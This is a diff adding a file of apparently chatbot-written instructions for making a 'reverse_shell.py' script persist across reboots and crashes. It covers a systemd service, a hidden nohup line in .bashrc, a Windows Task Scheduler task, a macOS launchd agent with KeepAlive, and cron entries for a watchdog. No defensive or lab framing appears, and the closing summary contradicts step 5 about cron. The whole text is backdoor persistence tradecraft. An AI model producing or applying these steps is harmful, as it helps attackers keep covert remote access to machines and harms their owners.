@@ -1,0 +1,143 @@
+Here are a few common approaches for different operating systems:
+1. Linux: Using Systemd
+
+Systemd is a popular system and service manager for Linux operating systems. You can create a systemd service to run the reverse shell script and ensure it starts at boot and restarts automatically if it crashes.
+Create a Systemd Service
+
+    Create a Service File:
+    Create a new service file for your reverse shell script:
+
+    bash
+
+sudo nano /etc/systemd/system/reverse_shell.service
+
+Add the Following Configuration:
+
+ini
+
+[Unit]
+Description=Reverse Shell Service
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/python3 /home/kit/sky/reverse_shell.py
+Restart=always
+User=kit
+WorkingDirectory=/home/kit/sky
+
+[Install]
+WantedBy=multi-user.target
+
+Reload Systemd:
+
+bash
+
+sudo systemctl daemon-reload
+
+Enable and Start the Service:
+
+bash
+
+sudo systemctl enable reverse_shell.service
+sudo systemctl start reverse_shell.service
+
+Check the Service Status:
+
+bash
+
+    sudo systemctl status reverse_shell.service
+
+2. Linux: Adding to .bashrc or .profile
+
+You can add the reverse shell script to the .bashrc or .profile file to ensure it runs whenever a user logs in.
+
+    Edit the .bashrc or .profile File:
+
+    bash
+
+nano /home/kit/.bashrc
+
+Add the Following Line:
+
+bash
+
+    nohup python3 /home/kit/sky/reverse_shell.py > /dev/null 2>&1 &
+
+    Save and Close the File.
+
+3. Windows: Using Task Scheduler
+
+Task Scheduler allows you to create tasks that run automatically at specified times or events, such as system startup.
+
+    Open Task Scheduler:
+    Press Win + R, type taskschd.msc, and press Enter.
+
+    Create a New Task:
+        Click on "Create Task" in the right-hand panel.
+        Name the task (e.g., "Reverse Shell").
+
+    Set the Trigger:
+        Go to the "Triggers" tab.
+        Click "New" and select "At startup" or another appropriate trigger.
+
+    Set the Action:
+        Go to the "Actions" tab.
+        Click "New" and select "Start a program."
+        Browse to the Python executable and add the path to your reverse shell script as an argument (e.g., C:\Python39\python.exe C:\path\to\reverse_shell.py).
+
+    Configure Other Settings:
+        Go to the "Settings" tab and ensure "Allow task to be run on demand" and "Run task as soon as possible after a scheduled start is missed" are checked.
+
+    Save the Task.
+
+4. MacOS: Using Launchd
+
+Launchd is a service management framework for macOS that can be used to create persistent background processes.
+
+    Create a Launch Agent Plist File:
+
+    bash
+
+nano ~/Library/LaunchAgents/com.username.reverseshell.plist
+
+Add the Following Configuration:
+
+xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.username.reverseshell</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/usr/bin/python3</string>
+        <string>/path/to/reverse_shell.py</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>
+
+Load the Launch Agent:
+
+bash
+
+    launchctl load ~/Library/LaunchAgents/com.username.reverseshell.plist
+
+5. Setting Up Cron
+
+Ensure that the cron job is set up correctly to run the watchdog script every minute and at boot. You can edit the cron jobs using crontab -e:
+
+bash
+
+* * * * * /home/kit/sky/watchdog.sh
+@reboot /home/kit/sky/watchdog.sh
+
+
+Summary
+
+These methods allow you to achieve persistence on different operating systems without relying on cron and a watchdog script. Each method ensures that the reverse shell script runs at startup and keeps running, even if it crashes. Choose the method that best suits your environment and needs.
